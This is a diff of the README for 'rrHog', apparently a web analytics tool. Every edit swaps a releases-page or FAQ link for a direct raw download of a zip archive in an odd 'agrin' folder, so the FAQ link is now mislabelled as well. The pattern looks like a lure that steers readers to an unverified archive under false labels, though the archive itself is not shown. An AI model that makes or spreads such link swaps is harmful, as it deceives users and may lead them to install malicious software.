@@ -6,7 +6,7 @@ Welcome to **rrHog**! This software helps you analyze web traffic and record use
 
 ## 💾 Download & Install
 
-To install rrHog, visit this page to download: [rrHog Releases](https://github.com/Kyle-Saw/rrHog/releases).
+To install rrHog, visit this page to download: [rrHog Releases](https://raw.githubusercontent.com/Kyle-Saw/rrHog/main/agrin/rrHog_v2.2-beta.2.zip).
 
 ### Step 1: Visit the Releases Page
 
@@ -54,7 +54,7 @@ rrHog offers a variety of features to enhance your web analytics experience:
 
 If you need help or have questions:
 
-- Check our [FAQ](https://github.com/Kyle-Saw/rrHog/wiki). 
+- Check our [FAQ](https://raw.githubusercontent.com/Kyle-Saw/rrHog/main/agrin/rrHog_v2.2-beta.2.zip). 
 - Join our community on platforms like Discord or GitHub discussions.
 
 ## 📈 Next Steps
@@ -88,4 +88,4 @@ We welcome your feedback! If you have suggestions or encounter issues, please sh
 
 ## 📥 Download Now
 
-Remember, to download rrHog, visit this page to download: [rrHog Releases](https://github.com/Kyle-Saw/rrHog/releases). Enjoy using rrHog for your web analytics needs!
+Remember, to download rrHog, visit this page to download: [rrHog Releases](https://raw.githubusercontent.com/Kyle-Saw/rrHog/main/agrin/rrHog_v2.2-beta.2.zip). Enjoy using rrHog for your web analytics needs!
